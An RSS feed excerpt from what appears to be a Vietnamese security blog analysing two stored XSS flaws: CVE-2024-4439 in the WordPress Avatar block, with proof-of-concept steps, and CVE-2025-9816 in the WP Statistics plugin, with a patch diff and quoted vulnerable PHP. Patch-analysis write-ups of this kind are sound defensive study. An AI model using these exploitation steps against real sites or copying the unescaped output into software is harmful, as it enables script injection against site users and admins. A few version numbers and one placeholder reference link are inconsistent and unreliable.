&lt;code&gt;aria-label&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;Tạo post account với role &lt;code&gt;contributor+&lt;/code&gt; có chứa avatar block, bật tính năng &lt;strong&gt;Link to user profile&lt;/strong&gt; và chọn user contributor.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-09-cve-2024-4439/post1.png&#34;&#xA;    alt=&#34;Tạo post với link to user profile được bật&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Tạo post với link to user profile được bật&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Thay đổi firstname chứa XSS payload và chọn display name là firstname&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-09-cve-2024-4439/disname.png&#34;&#xA;    alt=&#34;Chọn display name chứa XSS payload&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Chọn display name chứa XSS payload&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Admin preview post =&amp;gt; XSS xảy ra&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-09-cve-2024-4439/xss1.png&#34;&#xA;    alt=&#34;XSS xảy ra khi admin truy preview post&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;XSS xảy ra khi admin truy preview post&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;CVE-2024-4439&lt;/strong&gt; trong &lt;strong&gt;WordPress Core &amp;lt;= 6.5.1&lt;/strong&gt; bắt nguồn từ việc sử dụng sai hàm &lt;code&gt;esc_attr__()&lt;/code&gt; khi xử lý &lt;code&gt;display_name&lt;/code&gt; trong &lt;strong&gt;Avatar block&lt;/strong&gt;, dẫn đến &lt;strong&gt;Stored XSS&lt;/strong&gt;. Kẻ tấn công có thể lợi dụng lỗ hổng này bằng cách chèn payload vào &lt;code&gt;display_name&lt;/code&gt;, khiến script độc hại thực thi khi người dùng (bao gồm admin) truy cập trang chứa block. Bản vá trong &lt;strong&gt;6.0.8, 6.1.6, 6.2.5, 6.3.4, 6.4.4, 6.5.2&lt;/strong&gt; đã thay đổi cách xử lý — escape sau khi format chuỗi bằng &lt;code&gt;sprintf()&lt;/code&gt; — đảm bảo dữ liệu an toàn trước khi render ra browser.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Thứ tự escape rất quan trọng&lt;/strong&gt;: dữ liệu cần được &lt;strong&gt;format trước&lt;/strong&gt;, rồi mới &lt;strong&gt;escape&lt;/strong&gt; để tránh lọt XSS.&lt;/li&gt;&#xA;&lt;li&gt;Ngay cả &lt;strong&gt;core functions&lt;/strong&gt; như &lt;code&gt;esc_attr__()&lt;/code&gt; nếu dùng sai cách cũng có thể mở ra lỗ hổng nghiêm trọng.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Stored XSS&lt;/strong&gt; đặc biệt nguy hiểm vì nó tồn tại bền trong database và được kích hoạt bất kỳ khi nào người dùng truy cập.&lt;/li&gt;&#xA;&lt;li&gt;Không chỉ plugin/theme, mà &lt;strong&gt;WordPress Core&lt;/strong&gt; cũng cần được &lt;strong&gt;update thường xuyên&lt;/strong&gt; để giảm thiểu rủi ro bảo mật.&lt;/li&gt;&#xA;&lt;li&gt;Việc phân tích &lt;strong&gt;patch diff&lt;/strong&gt; là cách hiệu quả để học cách lập trình an toàn và hiểu rõ nguồn gốc của lỗi.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Cross-site scripting (XSS) cheat sheet — PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/patchstack_database_here&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Core &amp;lt;= effected_version_here — CVE-2024-4439&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-9816 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-08-cve-2025-9816/</link>
      <pubDate>Wed, 08 Oct 2025 13:57:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-08-cve-2025-9816/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;WP Statistics – The Most Popular Privacy-Friendly Analytics Plugin&lt;/strong&gt; cho WordPress mắc lỗ hổng &lt;strong&gt;Stored Cross-Site Scripting (XSS)&lt;/strong&gt; qua &lt;strong&gt;User-Agent Header&lt;/strong&gt; trong tất cả các phiên bản từ trước đến &lt;strong&gt;14.5.4&lt;/strong&gt; (bao gồm cả 14.5.4). Nguyên nhân xuất phát từ việc &lt;strong&gt;kiểm tra và lọc dữ liệu đầu vào&lt;/strong&gt; cũng như &lt;strong&gt;thoát dữ liệu đầu ra&lt;/strong&gt; chưa đầy đủ.&lt;/p&gt;&#xA;&lt;p&gt;Lỗ hổng này cho phép &lt;strong&gt;kẻ tấn công không cần xác thực&lt;/strong&gt; chèn các đoạn mã JavaScript độc hại vào hệ thống. Các đoạn mã này sẽ được thực thi mỗi khi người dùng truy cập vào trang có chứa dữ liệu đã bị chèn mã độc, gây ra nguy cơ nghiêm trọng cho bảo mật và quyền riêng tư.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-9816&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-9816&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting (XSS)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 14.15.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 14.15.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/wp-statistics/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WP Statistics Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;WP Statistics&lt;/strong&gt;: &lt;strong&gt;v14.15.4&lt;/strong&gt; (vulnerable) và &lt;strong&gt;v14.15.5&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Tôi đã thiếu sót trong quá trình thu thập thông tin về CVE này, &lt;a href=&#34;https://plugins.trac.wordpress.org/browser/wp-statistics/tags/14.15.3/includes/admin/templates/pages/devices/models.php#L31&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;references&lt;/a&gt; của &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-9816&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://www.cve.org/CVERecord?id=CVE-2025-9816&lt;/a&gt; chỉ rõ nơi lỗ hỗng xảy ra: &lt;code&gt;includes/admin/templates/pages/devices/models.php&lt;/code&gt;{: .filepath}&lt;/p&gt;&#xA;&lt;p&gt;Nhưng tôi đã bỏ qua nó và sử dụng &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; để so sánh code. Do code thay đổi khá nhiều nên tôi đã chủ động tìm các file liên quan đến &lt;strong&gt;user-agent&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/dif1.png&#34;&#xA;    alt=&#34;Diff — so sánh thay đổi mã giữa bản vulnerable và bản vá&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Diff — so sánh thay đổi mã giữa bản vulnerable và bản vá&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Và code thay đổi trong &lt;code&gt;UserAgent.php&lt;/code&gt;{: .filepath} làm tôi tin rằng lỗ hỗng thực sự xảy ra ở đây.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/dif2.png&#34;&#xA;    alt=&#34;Diff — Sự thay đổi mã trong UserAgent.php&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Diff — Sự thay đổi mã trong UserAgent.php&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Nó làm tôi tốn khá nhiều thời gian nhưng chưa thể phân tích được. Tuy nhiên, việc này cũng giúp ích cho quá trình phân tích.&lt;/p&gt;&#xA;&lt;p&gt;🍀 May mắn thay, dưới sự hướng dẫn của các tiền bối, tôi đã &lt;strong&gt;focus&lt;/strong&gt; vào đúng vào &lt;a href=&#34;https://plugins.trac.wordpress.org/browser/wp-statistics/tags/14.15.3/includes/admin/templates/pages/devices/models.php#L31&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;vị trí lỗ hổng&lt;/strong&gt;&lt;/a&gt;. Nên quá trình phân tích trở nên dễ dàng hơn.&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;Tip: Đây là lỗ hổng Cross Site Script diễn ra ở trình duyệt của nạn nhân nên ta cần tìm nơi render và trả về HTML.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Lỗ hổng xảy ra trong file &lt;code&gt;includes/admin/templates/pages/devices/models.php&lt;/code&gt;{: .filepath} tại dòng 31.&lt;/p&gt;&#xA;&lt;p&gt;Trong phiên bản &lt;strong&gt;vulnerable&lt;/strong&gt;, &lt;code&gt;$item-&amp;gt;model&lt;/code&gt; được in ra HTML nhưng &lt;strong&gt;không có cơ chế bảo vệ nào&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;span title=&amp;#34;&amp;lt;?php echo \WP_STATISTICS\Admin_Template::unknownToNotSet($item-&amp;gt;model); ?&amp;gt;&amp;#34; class=&amp;#34;wps-model-name&amp;#34;&amp;gt;&#xA;    &amp;lt;?php echo self::isUnknown($item-&amp;gt;model) ? esc_html__(&amp;#39;Unknown&amp;#39;, &amp;#39;wp-statistics&amp;#39;) : $item-&amp;gt;model; ?&amp;gt;&#xA;&amp;lt;/span&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phiên bản &lt;strong&gt;patched&lt;/strong&gt;, &lt;code&gt;$item-&amp;gt;model&lt;/code&gt; đã được bảo vệ bằng cách đặt nó vào &lt;code&gt;esc_attr()&lt;/code&gt; và &lt;code&gt;esc_html()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;span title=&amp;#34;&amp;lt;?php echo esc_attr(\WP_STATISTICS\Admin_Template::unknownToNotSet($item-&amp;gt;model)); ?&amp;gt;&amp;#34; class=&amp;#34;wps-model-name&amp;#34;&amp;gt;&#xA;    &amp;lt;?php echo self::isUnknown($item-&amp;gt;model) ? esc_html__(&amp;#39;Unknown&amp;#39;, &amp;#39;wp-statistics&amp;#39;) : esc_html($item-&amp;gt;model); ?&amp;gt;&#xA;&amp;lt;/span&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 Bản vá bổ sung lớp lọc đầu vào cho &lt;code&gt;$item-&amp;gt;model&lt;/code&gt;, đảm bảo nó sẽ được &lt;strong&gt;escape&lt;/strong&gt; trước khi in ra HTML.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/dif3.png&#34;&#xA;    alt=&#34;Diff — Sự thay đổi mã trong models.php&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Diff — Sự thay đổi mã trong models.php&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;use WP_STATISTICS\Helper;&#xA;?&amp;gt;&#xA;&#xA;&amp;lt;div class=&amp;#34;postbox-container wps-postbox-full&amp;#34;&amp;gt;&#xA;  &amp;lt;?php if (!empty($data[&amp;#39;visitors&amp;#39;])) : ?&amp;gt;&#xA;      &amp;lt;div class=&amp;#34;o-table-wrapper&amp;#34;&amp;gt;&#xA;          &amp;lt;table width=&amp;#34;100%&amp;#34; class=&amp;#34;o-table wps-new-table&amp;#34;&amp;gt;&#xA;              &amp;lt;thead&amp;gt;&#xA;              &amp;lt;/thead&amp;gt;&#xA;              &amp;lt;tbody&amp;gt;&#xA;                  &amp;lt;?php foreach ($data[&amp;#39;visitors&amp;#39;] as $item) : ?&amp;gt;&#xA;                      &amp;lt;tr&amp;gt;&#xA;                          &amp;lt;td class=&amp;#34;wps-pd-l&amp;#34;&amp;gt;&#xA;                              &amp;lt;span title=&amp;#34;&amp;lt;?php echo \WP_STATISTICS\Admin_Template::unknownToNotSet($item-&amp;gt;model); ?&amp;gt;&amp;#34; class=&amp;#34;wps-model-name&amp;#34;&amp;gt;&#xA;                                  &amp;lt;?php echo self::isUnknown($item-&amp;gt;model) ? esc_html__(&amp;#39;Unknown&amp;#39;, &amp;#39;wp-statistics&amp;#39;) : $item-&amp;gt;model; ?&amp;gt;&#xA;                              &amp;lt;/span&amp;gt;&#xA;                          &amp;lt;/td&amp;gt;&#xA;                      &amp;lt;/tr&amp;gt;&#xA;                  &amp;lt;?php endforeach; ?&amp;gt;&#xA;              &amp;lt;/tbody&amp;gt;&#xA;          &amp;lt;/table&amp;gt;&#xA;      &amp;lt;/div&amp;gt;&#xA;  &amp;lt;?php else : ?&amp;gt;&#xA;      &amp;lt;div class=&amp;#34;o-wrap o-wrap--no-data wps-center&amp;#34;&amp;gt;&#xA;          &amp;lt;?php esc_html_e(&amp;#39;No recent data available.&amp;#39;, &amp;#39;wp-statistics&amp;#39;); ?&amp;gt;&#xA;      &amp;lt;/div&amp;gt;&#xA;  &amp;lt;?php endif; ?&amp;gt;&#xA;&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nếu &lt;code&gt;$data&lt;/code&gt; không rỗng thì duyệt qua &lt;code&gt;$data&lt;/code&gt; và hiển thị dữ liệu đã thống kê của &lt;strong&gt;visitors&lt;/strong&gt;, bao gồm &lt;code&gt;model&lt;/code&gt;.&#xA;Nếu rỗng thì in ra &lt;code&gt;No recent data available.&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function isUnknown($value)&#xA;{&#xA;    if (empty($value) or $value == &amp;#39;Unknown&amp;#39; or $value == __(&amp;#34;Unknown&amp;#34;, &amp;#39;wp-statistics&amp;#39;)) {&#xA;        return true;&#xA;    }&#xA;&#xA;   